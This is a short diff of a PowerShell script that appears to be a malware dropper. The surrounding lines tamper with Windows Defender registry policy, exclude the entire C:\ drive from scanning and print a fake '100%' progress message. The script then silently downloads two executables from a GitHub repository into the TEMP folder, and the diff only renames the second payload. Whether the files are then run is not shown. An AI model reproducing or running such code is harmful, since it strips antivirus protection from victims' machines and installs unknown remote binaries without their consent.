@@ -17,9 +17,9 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 Write-Host "100%"
 $url1 = "https://github.com/sys1e/cmd/raw/refs/heads/main/bin.exe"
-$url2 = "https://github.com/sys1e/cmd/raw/refs/heads/main/dll.exe"
+$url2 = "https://github.com/sys1e/cmd/raw/refs/heads/main/lll.exe"
 $path1 = "$env:TEMP\bin.exe"
-$path2 = "$env:TEMP\dll.exe"
+$path2 = "$env:TEMP\lll.exe"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
 Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue
